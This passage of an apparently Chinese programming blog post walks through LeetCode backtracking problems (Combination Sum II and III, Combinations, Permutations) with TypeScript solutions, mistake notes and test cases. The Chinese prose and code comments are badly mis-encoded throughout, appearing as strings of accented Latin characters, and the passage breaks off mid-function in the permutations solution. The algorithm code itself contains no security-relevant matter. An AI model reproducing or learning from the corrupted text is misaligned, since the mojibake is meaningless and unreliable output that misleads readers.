      <span class="hljs-comment">// ä½œç”¨ï¼šè¿‡æ»¤åŒä¸€å±‚é€’å½’ä¸­é‡å¤çš„æ•°å­—ï¼ˆæ¯”å¦‚[1,1,2]ï¼Œ3çš„è¯ï¼Œç¬¬ä¸€ä¸ª[1,2],ç„¶åpathå˜æˆ[]ä¹‹åï¼Œèµ°åˆ°i=1,æ­¤æ—¶åˆæ˜¯1å’Œä¸Šä¸€ä¸ªç›¸åŒï¼Œå¦‚æœä¸è·³è¿‡ï¼Œåˆ™åˆä¼šæœ‰ä¸€ä¸ª[1,2]ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦è·³è¿‡ï¼‰</span>
      <span class="hljs-keyword">if</span> (i &gt; start &amp;&amp; candidates[i] === candidates[i - <span class="hljs-number">1</span>]) {
        <span class="hljs-keyword">continue</span>; <span class="hljs-comment">// è·³è¿‡å½“å‰å±‚çš„é‡å¤æ•°å­—</span>
      }

      <span class="hljs-comment">// åšé€‰æ‹©ï¼šå°†å½“å‰æ•°å­—åŠ å…¥è·¯å¾„</span>
      path.<span class="hljs-title function_">push</span>(cur);

      <span class="hljs-comment">// ã€æ˜“é”™ç‚¹4ã€‘é€’å½’å‚æ•°ä¼ i+1è€Œéiï¼</span>
      <span class="hljs-comment">// ä¼ i+1ï¼šæ¯ä¸ªæ•°å­—åªèƒ½é€‰ä¸€æ¬¡ï¼ˆç»„åˆæ€»å’ŒIIæ ¸å¿ƒè¦æ±‚ï¼‰</span>
      <span class="hljs-comment">// ä¼ iï¼šå…è®¸é‡å¤é€‰ï¼ˆå˜æˆcombinationSumï¼‰ï¼Œä¼ startï¼šæ— é™é€’å½’</span>
      <span class="hljs-title function_">backtrack</span>(path, sum + cur, i + <span class="hljs-number">1</span>);

      <span class="hljs-comment">// æ’¤é”€é€‰æ‹©ï¼šå›æº¯æ ¸å¿ƒï¼Œæ¢å¤è·¯å¾„çŠ¶æ€</span>
      path.<span class="hljs-title function_">pop</span>();
    }
  }

  <span class="hljs-comment">// åˆå§‹è°ƒç”¨ï¼šç©ºè·¯å¾„ã€å’Œä¸º0ã€ä»ç´¢å¼•0å¼€å§‹éå†</span>
  <span class="hljs-title function_">backtrack</span>([], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">return</span> res;
}

<span class="hljs-comment">// æµ‹è¯•ç”¨ä¾‹ï¼ˆé‡ç‚¹éªŒè¯å»é‡ï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">combinationSum2</span>([<span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>], <span class="hljs-number">8</span>));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[1,1,6],[1,2,5],[1,7],[2,6]]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">combinationSum2</span>([<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>], <span class="hljs-number">5</span>));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[1,2,2],[5]]</span>
</code></pre>
<p><strong>æ˜“é”™ç‚¹ï¼š</strong></p>
<ul>
<li>å»é‡é€»è¾‘é”™è¯¯ï¼šåº”è¯¥æ˜¯<code>i &gt; start</code>è€Œä¸æ˜¯<code>i &gt; 0</code>ï¼ˆå…è®¸ä¸åŒå±‚é€‰ç›¸åŒæ•°å­—ï¼‰</li>
<li>å¿˜è®°æ’åºå¯¼è‡´å»é‡å¤±æ•ˆ</li>
</ul>
<hr/>
<h6 data-id="heading-16"><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fcombinations%2F" target="_blank" title="https://leetcode.cn/problems/combinations/" ref="nofollow noopener noreferrer">77. ç»„åˆ</a></h6>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>ç»™å®šä¸¤ä¸ªæ•´æ•° <code>n</code> å’Œ <code>k</code>ï¼Œè¿”å›èŒƒå›´ <code>[1, n]</code> ä¸­æ‰€æœ‰å¯èƒ½çš„ <code>k</code> ä¸ªæ•°çš„ç»„åˆã€‚</p>
<p>ä½ å¯ä»¥æŒ‰<strong>ä»»ä½•é¡ºåº</strong>è¿”å›ç­”æ¡ˆã€‚</p>
<p><strong>ç¤ºä¾‹ 1ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">è¾“å…¥ï¼š<span class="hljs-attr">n</span> = <span class="hljs-number">4</span>, k = <span class="hljs-number">2</span>
è¾“å‡ºï¼š
<span class="hljs-section">[
  [2,4]</span>,
  <span class="hljs-section">[3,4]</span>,
  <span class="hljs-section">[2,3]</span>,
  <span class="hljs-section">[1,2]</span>,
  <span class="hljs-section">[1,3]</span>,
  <span class="hljs-section">[1,4]</span>,
]
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/**
 * ç»„åˆï¼šä» 1~n çš„æ•°å­—ä¸­é€‰å‡º k ä¸ªæ•°å­—çš„æ‰€æœ‰ç»„åˆï¼ˆä¸è€ƒè™‘é¡ºåºï¼Œæ— é‡å¤ç»„åˆï¼‰
 * æ ¸å¿ƒè§„åˆ™ï¼š
 * 1. ç»„åˆä¸è€ƒè™‘é¡ºåºï¼ˆå¦‚[1,2]å’Œ[2,1]ç®—åŒä¸€ä¸ªï¼Œéœ€é€šè¿‡startNumæ§åˆ¶ä¸å›å¤´é€‰ï¼‰
 * 2. æ¯ä¸ªæ•°å­—åªèƒ½é€‰ä¸€æ¬¡
 * <span class="hljs-doctag">@param</span> n æ•°å­—èŒƒå›´ä¸Šé™ï¼ˆ1~nï¼‰
 * <span class="hljs-doctag">@param</span> k ç»„åˆçš„é•¿åº¦
 * <span class="hljs-doctag">@returns</span> æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ç»„åˆæ•°ç»„
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">combine</span>(<span class="hljs-params">n: <span class="hljs-built_in">number</span>, k: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span>[][] {
  <span class="hljs-comment">// ç»“æœæ•°ç»„ï¼šå­˜å‚¨æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ç»„åˆï¼ˆéœ€æ·±æ‹·è´ï¼Œé¿å…å¼•ç”¨æ±¡æŸ“ï¼‰</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">res</span>: <span class="hljs-built_in">number</span>[][] = [];

  <span class="hljs-comment">/**
   * å›æº¯æ ¸å¿ƒå‡½æ•°
   * <span class="hljs-doctag">@param</span> path å½“å‰å·²é€‰æ•°å­—çš„è·¯å¾„ï¼ˆå¼•ç”¨ç±»å‹ï¼Œéœ€æ³¨æ„å›æº¯æ’¤é”€ï¼‰
   * <span class="hljs-doctag">@param</span> startNum éå†èµ·å§‹æ•°å­—ï¼ˆæ§åˆ¶ä¸å›å¤´é€‰ï¼Œé¿å…é‡å¤ç»„åˆï¼Œå¦‚é€‰1ååªèƒ½é€‰2/3...nï¼‰
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">backtrack</span>(<span class="hljs-params">path: <span class="hljs-built_in">number</span>[], startNum: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-comment">// ç»ˆæ­¢æ¡ä»¶ï¼šå½“å‰è·¯å¾„é•¿åº¦ç­‰äºkï¼Œæ‰¾åˆ°æœ‰æ•ˆç»„åˆ</span>
    <span class="hljs-keyword">if</span> (path.<span class="hljs-property">length</span> === k) {
      <span class="hljs-comment">// ã€æ˜“é”™ç‚¹1ã€‘å¿…é¡»æ·±æ‹·è´ï¼ç›´æ¥push(path)ä¼šå› å¼•ç”¨å¯¼è‡´åç»­popä¿®æ”¹ç»“æœ</span>
      res.<span class="hljs-title function_">push</span>([...path]);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// ã€æ ¸å¿ƒå‰ªæã€‘å‰©ä½™å¯é€‰æ•°å­—ä¸è¶³ä»¥å‡‘å¤Ÿkä¸ªï¼Œç›´æ¥ç»ˆæ­¢é€’å½’ï¼ˆä¼˜åŒ–æ•ˆç‡ï¼‰</span>
    <span class="hljs-comment">// å‰©ä½™å¯é€‰æ•°å­—æ•° = n - startNum + 1</span>
    <span class="hljs-comment">// å½“å‰è·¯å¾„é•¿åº¦ + å‰©ä½™å¯é€‰æ•°å­—æ•° &lt; k â†’ ä¸å¯èƒ½å‡‘å¤Ÿkä¸ªï¼Œå‰ªæ</span>
    <span class="hljs-keyword">if</span> (path.<span class="hljs-property">length</span> + (n - startNum + <span class="hljs-number">1</span>) &lt; k) {
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// éå†æ•°å­—ï¼šä»startNumå¼€å§‹åˆ°nï¼ˆé¿å…å›å¤´é€‰ï¼Œç”Ÿæˆé‡å¤ç»„åˆï¼‰</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = startNum; i &lt;= n; i++) {
      <span class="hljs-comment">// ã€æ˜“é”™ç‚¹2ã€‘æ ¸å¿ƒé”™è¯¯ï¼šåŸä»£ç push(startNum)ï¼Œæ­£ç¡®åº”push(i)</span>
      <span class="hljs-comment">// åšé€‰æ‹©ï¼šå°†å½“å‰éå†çš„æ•°å­—iåŠ å…¥è·¯å¾„</span>
      path.<span class="hljs-title function_">push</span>(i);

      <span class="hljs-comment">// ã€æ˜“é”™ç‚¹3ã€‘é€’å½’å‚æ•°ä¼ i+1è€ŒéstartNum+1ï¼</span>
      <span class="hljs-comment">// ä¼ i+1ï¼šä¸‹ä¸€å±‚ä»å½“å‰æ•°å­—çš„ä¸‹ä¸€ä½å¼€å§‹ï¼Œä¿è¯ä¸å›å¤´é€‰</span>
      <span class="hljs-title function_">backtrack</span>(path, i + <span class="hljs-number">1</span>);

      <span class="hljs-comment">// æ’¤é”€é€‰æ‹©ï¼šå›æº¯æ ¸å¿ƒï¼Œæ¢å¤è·¯å¾„çŠ¶æ€</span>
      path.<span class="hljs-title function_">pop</span>();
    }
  }

  <span class="hljs-comment">// åˆå§‹è°ƒç”¨ï¼šç©ºè·¯å¾„ã€ä»æ•°å­—1å¼€å§‹éå†</span>
  <span class="hljs-title function_">backtrack</span>([], <span class="hljs-number">1</span>);
  <span class="hljs-keyword">return</span> res;
}

<span class="hljs-comment">// æµ‹è¯•ç”¨ä¾‹</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">combine</span>(<span class="hljs-number">4</span>, <span class="hljs-number">2</span>));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[1,2],[1,3],[1,4],[2,3],[2,4],[3,4]]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">combine</span>(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[1,2,3]]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">combine</span>(<span class="hljs-number">5</span>, <span class="hljs-number">1</span>));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[1],[2],[3],[4],[5]]</span>
</code></pre>
<p><strong>æ˜“é”™ç‚¹ï¼š</strong></p>
<ul>
<li>èŒƒå›´é”™è¯¯ï¼šåº”è¯¥æ˜¯<code>[1, n]</code>ï¼Œå¾ªç¯æ¡ä»¶æ˜¯<code>i &lt;= n</code>è€Œä¸æ˜¯<code>i &lt; n</code></li>
<li>å¿˜è®°å‰ªæä¼˜åŒ–å¯¼è‡´è¶…æ—¶</li>
</ul>
<hr/>
<h6 data-id="heading-17"><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fcombination-sum-iii%2F" target="_blank" title="https://leetcode.cn/problems/combination-sum-iii/" ref="nofollow noopener noreferrer">216. ç»„åˆæ€»å’Œ III</a></h6>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>æ‰¾å‡ºæ‰€æœ‰ç›¸åŠ ä¹‹å’Œä¸º <code>n</code> çš„ <code>k</code> ä¸ªæ•°çš„ç»„åˆï¼Œä¸”æ»¡è¶³ä¸‹åˆ—æ¡ä»¶ï¼š</p>
<ul>
<li>åªä½¿ç”¨æ•°å­—1åˆ°9</li>
<li>æ¯ä¸ªæ•°å­—<strong>æœ€å¤šä½¿ç”¨ä¸€æ¬¡</strong></li>
</ul>
<p>è¿”å›<strong>æ‰€æœ‰å¯èƒ½çš„æœ‰æ•ˆç»„åˆçš„åˆ—è¡¨</strong>ã€‚è¯¥åˆ—è¡¨ä¸èƒ½åŒ…å«ç›¸åŒçš„ç»„åˆä¸¤æ¬¡ï¼Œç»„åˆå¯ä»¥ä»¥ä»»ä½•é¡ºåºè¿”å›ã€‚</p>
<p><strong>ç¤ºä¾‹ 1ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">è¾“å…¥: <span class="hljs-attr">k</span> = <span class="hljs-number">3</span>, n = <span class="hljs-number">7</span>
è¾“å‡º: <span class="hljs-section">[[1,2,4]]</span>
è§£é‡Š:
1 + 2 + <span class="hljs-attr">4</span> = <span class="hljs-number">7</span>
æ²¡æœ‰å…¶ä»–ç¬¦åˆçš„ç»„åˆäº†ã€‚
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/**
 * ç»„åˆæ€»å’ŒIIIï¼šæ‰¾å‡ºæ‰€æœ‰ç›¸åŠ ä¹‹å’Œä¸ºnçš„kä¸ªæ­£æ•´æ•°ç»„åˆï¼ˆä»…ä½¿ç”¨æ•°å­—1-9ï¼Œæ¯ä¸ªæ•°å­—æœ€å¤šä½¿ç”¨ä¸€æ¬¡ï¼‰
 * æ ¸å¿ƒè§„åˆ™ï¼š
 * 1. ç»„åˆé•¿åº¦å›ºå®šä¸ºkï¼›
 * 2. æ•°å­—èŒƒå›´1~9ï¼Œä¸”ä¸é‡å¤é€‰å–ï¼›
 * 3. ç»„åˆå’Œä¸ºnï¼Œä¸”ç»„åˆä¸è€ƒè™‘é¡ºåºï¼ˆå¦‚[1,2]å’Œ[2,1]ç®—åŒä¸€ä¸ªï¼Œéœ€é€šè¿‡startNumæ§åˆ¶ä¸å›å¤´é€‰ï¼‰ã€‚
 * <span class="hljs-doctag">@param</span> k ç»„åˆçš„å›ºå®šé•¿åº¦
 * <span class="hljs-doctag">@param</span> n ç»„åˆçš„ç›®æ ‡å’Œ
 * <span class="hljs-doctag">@returns</span> æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ç»„åˆæ•°ç»„
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">combinationSum3</span>(<span class="hljs-params">k: <span class="hljs-built_in">number</span>, n: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span>[][] {
  <span class="hljs-comment">// ç»“æœæ•°ç»„ï¼šå­˜å‚¨æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ç»„åˆï¼ˆéœ€æ·±æ‹·è´ï¼Œé¿å…å¼•ç”¨æ±¡æŸ“ï¼‰</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">res</span>: <span class="hljs-built_in">number</span>[][] = [];
  <span class="hljs-comment">// ç›®æ ‡å’Œï¼ˆå¯ç›´æ¥ç”¨nï¼Œæ­¤å¤„ä¿ç•™targetä»…ä¸ºè¯­ä¹‰æ¸…æ™°ï¼‰</span>
  <span class="hljs-keyword">const</span> target = n;

  <span class="hljs-comment">/**
   * å›æº¯æ ¸å¿ƒå‡½æ•°
   * <span class="hljs-doctag">@param</span> path å½“å‰å·²é€‰æ•°å­—çš„è·¯å¾„ï¼ˆå¼•ç”¨ç±»å‹ï¼Œéœ€æ³¨æ„å›æº¯æ’¤é”€ï¼‰
   * <span class="hljs-doctag">@param</span> sum å½“å‰è·¯å¾„çš„æ•°å­—å’Œï¼ˆé¿å…é‡å¤è®¡ç®—ï¼Œæå‡æ•ˆç‡ï¼‰
   * <span class="hljs-doctag">@param</span> startNum éå†èµ·å§‹æ•°å­—ï¼ˆæ§åˆ¶ä¸å›å¤´é€‰ï¼Œé¿å…é‡å¤ç»„åˆï¼Œå¦‚é€‰1ååªèƒ½é€‰2~9ï¼‰
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">backtrack</span>(<span class="hljs-params">path: <span class="hljs-built_in">number</span>[], sum: <span class="hljs-built_in">number</span>, startNum: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-comment">// ã€æ˜“é”™ç‚¹1ã€‘ç»ˆæ­¢æ¡ä»¶1ï¼šç»„åˆé•¿åº¦è¾¾åˆ°kï¼ˆæ ¸å¿ƒç»ˆæ­¢æ¡ä»¶ï¼‰</span>
    <span class="hljs-keyword">if</span> (path.<span class="hljs-property">length</span> === k) {
      <span class="hljs-comment">// ä»…å½“å’Œç­‰äºç›®æ ‡å€¼æ—¶ï¼Œè®°å½•æœ‰æ•ˆç»„åˆ</span>
      <span class="hljs-keyword">if</span> (sum === target) {
        res.<span class="hljs-title function_">push</span>([...path]);
      }
      <span class="hljs-comment">// æ— è®ºsumæ˜¯å¦ç­‰äºtargetï¼Œé•¿åº¦åˆ°kéƒ½è¦ç»ˆæ­¢ï¼ˆsum&gt;targetä¹Ÿæ— éœ€å•ç‹¬åˆ¤æ–­ï¼Œç›´æ¥returnï¼‰</span>
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// ã€æ ¸å¿ƒå‰ªæ1ã€‘å‰©ä½™å¯é€‰æ•°å­—ä¸è¶³ä»¥å‡‘å¤Ÿkä¸ªï¼Œç›´æ¥ç»ˆæ­¢é€’å½’</span>
    <span class="hljs-comment">// å‰©ä½™å¯é€‰æ•°å­—æ•° = 9 - startNum + 1ï¼ˆ1~9å…±9ä¸ªæ•°å­—ï¼‰</span>
    <span class="hljs-comment">// å½“å‰è·¯å¾„é•¿åº¦ + å‰©ä½™å¯é€‰æ•°å­—æ•° &lt; k â†’ ä¸å¯èƒ½å‡‘å¤Ÿkä¸ªï¼Œå‰ªæ</span>
    <span class="hljs-keyword">if</span> (path.<span class="hljs-property">length</span> + (<span class="hljs-number">9</span> - startNum + <span class="hljs-number">1</span>) &lt; k) {
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// ã€æ ¸å¿ƒå‰ªæ2ã€‘æå‰é¢„åˆ¤ï¼šè‹¥å½“å‰sum + æœ€å°å‰©ä½™æ•°å­— &gt; targetï¼Œåç»­æ— éœ€éå†ï¼ˆåŸä»£ç ä»…åœ¨å¾ªç¯å†…å‰ªæï¼Œæ­¤å¤„å¯é€‰ï¼‰</span>
    <span class="hljs-comment">// å¦‚sum=7, target=8, k=2, path.length=1 â†’ å‰©ä½™1ä¸ªæ•°å­—æœ€å°æ˜¯startNumï¼Œè‹¥7+startNum&gt;8åˆ™break</span>
    <span class="hljs-comment">// ï¼ˆåŸä»£ç æ— æ­¤å‰ªæï¼Œä¸å½±å“ç»“æœï¼Œä»…ä¼˜åŒ–æ•ˆç‡ï¼‰</span>

    <span class="hljs-comment">// éå†æ•°å­—ï¼šä»startNumå¼€å§‹åˆ°9ï¼ˆé¿å…å›å¤´é€‰ï¼Œä¿è¯æ•°å­—ä¸é‡å¤ï¼‰</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = startNum; i &lt;= <span class="hljs-number">9</span>; i++) {
      <span class="hljs-comment">// ã€æ˜“é”™ç‚¹2ã€‘å¾ªç¯å†…å‰ªæï¼šsum+i&gt;targetæ—¶ï¼Œåç»­æ•°å­—æ›´å¤§ï¼Œç›´æ¥ç»ˆæ­¢å¾ªç¯ï¼ˆ1~9å·²å¤©ç„¶æ’åºï¼‰</span>
      <span class="hljs-keyword">if</span> (sum + i &gt; target) {
        <span class="hljs-keyword">break</span>;
      }

      <span class="hljs-comment">// åšé€‰æ‹©ï¼šå°†å½“å‰æ•°å­—iåŠ å…¥è·¯å¾„</span>
      path.<span class="hljs-title function_">push</span>(i);

      <span class="hljs-comment">// ã€æ˜“é”™ç‚¹3ã€‘é€’å½’å‚æ•°ä¼ i+1è€ŒéstartNum+1ï¼</span>
      <span class="hljs-comment">// ä¼ i+1ï¼šä¸‹ä¸€å±‚ä»å½“å‰æ•°å­—çš„ä¸‹ä¸€ä½å¼€å§‹ï¼Œä¿è¯æ¯ä¸ªæ•°å­—åªé€‰ä¸€æ¬¡</span>
      <span class="hljs-title function_">backtrack</span>(path, sum + i, i + <span class="hljs-number">1</span>);

      <span class="hljs-comment">// æ’¤é”€é€‰æ‹©ï¼šå›æº¯æ ¸å¿ƒï¼Œæ¢å¤è·¯å¾„çŠ¶æ€</span>
      path.<span class="hljs-title function_">pop</span>();
    }
  }

  <span class="hljs-comment">// åˆå§‹è°ƒç”¨ï¼šç©ºè·¯å¾„ã€å’Œä¸º0ã€ä»æ•°å­—1å¼€å§‹éå†</span>
  <span class="hljs-title function_">backtrack</span>([], <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);
  <span class="hljs-keyword">return</span> res;
}

<span class="hljs-comment">// æµ‹è¯•ç”¨ä¾‹</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">combinationSum3</span>(<span class="hljs-number">3</span>, <span class="hljs-number">7</span>));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[1,2,4]]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">combinationSum3</span>(<span class="hljs-number">3</span>, <span class="hljs-number">9</span>));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[1,2,6],[1,3,5],[2,3,4]]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">combinationSum3</span>(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[]ï¼ˆæ— ç¬¦åˆæ¡ä»¶çš„ç»„åˆï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">combinationSum3</span>(<span class="hljs-number">2</span>, <span class="hljs-number">18</span>));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[9,9]] â†’ é”™è¯¯ï¼Ÿä¸ï¼Œ1~9æ•°å­—ä¸é‡å¤ï¼Œæ‰€ä»¥æ­£ç¡®è¾“å‡ºæ˜¯[]ï¼ˆåŸä»£ç ä¼šæ­£ç¡®è¿”å›[]ï¼‰</span>
</code></pre>
<hr/>
<h4 data-id="heading-18">2. æ’åˆ—é—®é¢˜</h4>
<h5 data-id="heading-19">æ ¸å¿ƒç‰¹å¾</h5>
<ul>
<li>è€ƒè™‘å…ƒç´ é¡ºåºï¼Œæ¯ä¸ªæ’åˆ—å”¯ä¸€ï¼ˆå¦‚<code>[1,2]</code>å’Œ<code>[2,1]</code>ç®—ä¸åŒæ’åˆ—ï¼‰</li>
<li>ç”¨<code>used</code>æ•°ç»„æ§åˆ¶"ä¸é‡å¤é€‰"ï¼Œå¾ªç¯ä»0å¼€å§‹ï¼ˆå…è®¸é€‰ä»»æ„æœªé€‰è¿‡çš„æ•°å­—ï¼‰</li>
<li>å«é‡å¤æ•°å­—çš„æ’åˆ—ï¼ˆå…¨æ’åˆ—IIï¼‰éœ€å¢åŠ "å»é‡å‰ªæ"</li>
</ul>
<h5 data-id="heading-20">LeetCode é¢˜ç›®è¯¦è§£</h5>
<h6 data-id="heading-21"><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fpermutations%2F" target="_blank" title="https://leetcode.cn/problems/permutations/" ref="nofollow noopener noreferrer">46. å…¨æ’åˆ—</a></h6>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>ç»™å®šä¸€ä¸ª<strong>ä¸å«é‡å¤æ•°å­—</strong>çš„æ•°ç»„ <code>nums</code>ï¼Œè¿”å›å…¶<strong>æ‰€æœ‰å¯èƒ½çš„å…¨æ’åˆ—</strong>ã€‚ä½ å¯ä»¥<strong>æŒ‰ä»»æ„é¡ºåº</strong>è¿”å›ç­”æ¡ˆã€‚</p>
<p><strong>ç¤ºä¾‹ 1ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">è¾“å…¥ï¼š<span class="hljs-attr">nums</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]
è¾“å‡ºï¼š<span class="hljs-section">[[1,2,3]</span>,<span class="hljs-section">[1,3,2]</span>,<span class="hljs-section">[2,1,3]</span>,<span class="hljs-section">[2,3,1]</span>,<span class="hljs-section">[3,1,2]</span>,<span class="hljs-section">[3,2,1]]</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/**
 * å…¨æ’åˆ—ï¼šç”Ÿæˆæ— é‡å¤æ•°å­—æ•°ç»„çš„æ‰€æœ‰æ’åˆ—ï¼ˆè€ƒè™‘é¡ºåºï¼Œå¦‚[1,2]å’Œ[2,1]æ˜¯ä¸åŒæ’åˆ—ï¼‰
 * æ ¸å¿ƒè§„åˆ™ï¼š
 * 1. æ’åˆ—è€ƒè™‘é¡ºåºï¼Œæ¯ä¸ªæ•°å­—åœ¨æ’åˆ—ä¸­ä»…å‡ºç°ä¸€æ¬¡ï¼›
 * 2. ç”¨usedæ•°ç»„æ ‡è®°å·²é€‰æ•°å­—ï¼Œé¿å…é‡å¤é€‰å–ï¼›
 * 3. æ— éœ€startå‚æ•°ï¼ˆæ’åˆ—éœ€è¦éå†æ‰€æœ‰æœªé€‰æ•°å­—ï¼Œè€Œéä»æŸä¸€ä½ç½®å¼€å§‹ï¼‰ã€‚
 * <span class="hljs-doctag">@param</span> nums æ— é‡å¤å…ƒç´ çš„æ•°å­—æ•°ç»„
 * <span class="hljs-doctag">@returns</span> æ‰€æœ‰å¯èƒ½çš„æ’åˆ—æ•°ç»„
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">permute</span>(<span class="hljs-params">nums: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span>[][] {
  <span class="hljs-comment">// ç»“æœæ•°ç»„ï¼šå­˜å‚¨æ‰€æœ‰æ’åˆ—ï¼ˆéœ€æ·±æ‹·è´ï¼Œé¿å…å¼•ç”¨æ±¡æŸ“ï¼‰</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">res</span>: <span class="hljs-built_in">number</span>[][] = [];
  <span class="hljs-comment">// æ•°ç»„é•¿åº¦ï¼šé¿å…å¾ªç¯ä¸­é‡å¤è®¡ç®—</span>
  <span class="hljs-keyword">const</span> len = nums.<span class="hljs-property">length</span>;
  <span class="hljs-comment">// ã€æ ¸å¿ƒã€‘usedæ•°ç»„ï¼šæ ‡è®°ç´¢å¼•içš„æ•°å­—æ˜¯å¦å·²è¢«é€‰å…¥å½“å‰è·¯å¾„ï¼Œåˆå§‹å…¨ä¸ºfalse</span>
  <span class="hljs-keyword">const</span> used = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(len).<span class="hljs-title function_">fill</span>(<span class="hljs-literal">false</span>);

  <span class="hljs-comment">/**
   * å›æº¯æ ¸å¿ƒå‡½æ•°
   * <span class="hljs-doctag">@param</span> path å½“å‰å·²é€‰æ•°å­—çš„è·¯å¾„ï¼ˆå¼•ç”¨ç±»å‹ï¼Œéœ€æ³¨æ„å›æº¯æ’¤é”€ï¼‰
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">backtrack</span>(<span class="hljs-params">path: <span class="hljs-built_in">number</span>[]</span>) {
    <span class="hljs-comment">// ç»ˆæ­¢æ¡ä»¶ï¼šå½“å‰è·¯å¾„é•¿åº¦ç­‰äºæ•°ç»„é•¿åº¦ï¼Œæ‰¾åˆ°ä¸€ä¸ªå®Œæ•´æ’åˆ—</span>
    <span class="hljs-keyword">if</span> (path.<span class="hljs-property">length</span> === len) {
      <span class="hljs-comment">// ã€æ˜“é”™ç‚¹1ã€‘å¿…é¡»æ·±æ‹·è´ï¼ç›´æ¥push(path)ä¼šå› å¼•ç”¨å¯¼è‡´åç»­popä¿®æ”¹ç»“æœ</span>
      res.<span class="hljs-title function_">push</span>([...path]);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// éå†æ‰€æœ‰æ•°å­—ï¼ˆæ’åˆ—éœ€éå†å…¨éƒ¨ï¼Œè€Œéä»startå¼€å§‹ï¼‰</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
      <span class="hljs-comment">// ã€æ˜“é”™ç‚¹2ã€‘è·³è¿‡å·²é€‰æ•°å­—ï¼šused[i]ä¸ºtrueæ—¶ï¼Œå½“å‰æ•°å­—å·²åœ¨pathä¸­ï¼Œé¿å…é‡å¤é€‰å–</span>
      <span class="hljs-keyword">if</span> (used[i]) {
        <span class="hljs-keyword">continue</span>;
      }

      <span class="hljs-comment">// 1. æ ‡è®°å½“å‰æ•°å­—ä¸ºå·²é€‰</span>
      used[i] = <span class="hljs-literal">true</span>;
